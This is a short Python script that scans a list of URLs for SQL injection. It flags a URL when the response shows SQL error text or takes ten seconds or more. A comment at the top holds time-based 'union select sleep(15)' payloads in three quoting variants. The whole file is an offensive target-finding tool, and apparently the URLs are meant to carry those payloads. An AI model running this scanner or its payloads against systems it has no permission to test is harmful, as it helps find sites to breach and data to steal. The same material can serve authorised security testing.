import requests
import sys
import time

# 1 union select sleep(15)-- -1' union select sleep(15)-- -"1 union select sleep(15)-- -

if len(sys.argv) != 2:
	exit(f'Usage: python3 {sys.argv[0]} filename')

filename = sys.argv[1]

with open(f'{filename}', 'r') as f:
	urls = [x.strip() for x in f.read().split('\n')]

print('Vulnerable to SQLi: \n')

for url in urls:
	try:
		start = time.time()
		r = requests.get(url)
		end = time.time()
		if (('error' in r.text.lower() and 'syntax' in r.text.lower()) or 'sql' in r.text.lower() or 'different number' in r.text.lower() or (end-start) >= 10):
			print(url)
	except requests.exceptions.RequestException: # handle all requests exception
		pass        
